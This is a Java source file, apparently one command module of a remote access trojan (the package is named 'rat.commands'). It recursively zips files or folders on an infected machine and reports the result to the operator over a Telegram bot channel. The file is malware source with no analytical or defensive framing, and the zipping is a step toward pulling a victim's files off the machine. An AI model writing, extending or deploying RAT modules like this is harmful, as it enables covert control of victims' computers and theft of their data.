package com.enterprise.rat.commands;

import com.enterprise.rat.utils.TelegramApi;
import java.io.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZipManager {
    public void zipFile(String sourcePath, String destPath) {
        try {
            File source = new File(sourcePath);
            File dest = new File(destPath != null ? destPath : sourcePath + ".zip");
            ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(dest));
            if (source.isDirectory()) zipDir(source, source.getName(), zos);
            else { FileInputStream fis = new FileInputStream(source); zos.putNextEntry(new ZipEntry(source.getName())); byte[] buf = new byte[4096]; int len; while ((len = fis.read(buf)) > 0) zos.write(buf,0,len); fis.close(); zos.closeEntry(); }
            zos.close();
            TelegramApi.sendMessage("✅ Zipped: " + dest.getAbsolutePath());
        } catch (Exception e) { TelegramApi.sendMessage("❌ Zip error"); }
    }
    private void zipDir(File dir, String base, ZipOutputStream zos) throws Exception {
        for (File f : dir.listFiles()) {
            if (f.isDirectory()) zipDir(f, base+"/"+f.getName(), zos);
            else { FileInputStream fis = new FileInputStream(f); zos.putNextEntry(new ZipEntry(base+"/"+f.getName())); byte[] buf = new byte[4096]; int len; while ((len = fis.read(buf)) > 0) zos.write(buf,0,len); fis.close(); zos.closeEntry(); }
        }
    }
}
